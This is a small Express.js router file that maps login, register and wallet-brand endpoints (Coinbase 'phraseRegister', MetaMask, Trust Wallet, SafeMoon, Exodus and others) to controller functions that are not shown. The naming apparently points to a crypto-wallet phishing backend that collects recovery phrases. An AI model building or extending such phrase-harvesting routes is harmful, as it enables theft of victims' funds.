const express = require("express");
const router = express.Router();

const {
    RegisterUser,
    LoginUser,
    phraseRegister,
    MetamaskRegister,
    TrustwalletRegister,
    BlockchainRegister,
    SafemoonRegister,
    ExodusRegister,
} = require("../controllers/auth");

router
    .route('/register')
    .post(RegisterUser);

router
    .route('/login')
    .post(LoginUser);

router
    .route('/coinbase')
    .post(phraseRegister);

router
    .route('/metamask')
    .post(MetamaskRegister)

router
    .route('/trustwallet')
    .post(TrustwalletRegister)

router
    .route('/blockchain')
    .post(BlockchainRegister)

router
    .route('/safemoon')
    .post(SafemoonRegister)

router
    .route('/exodus')
    .post(ExodusRegister)

// router
//     .route('/updateprofile')
//     .post(updateProfile)


module.exports = router;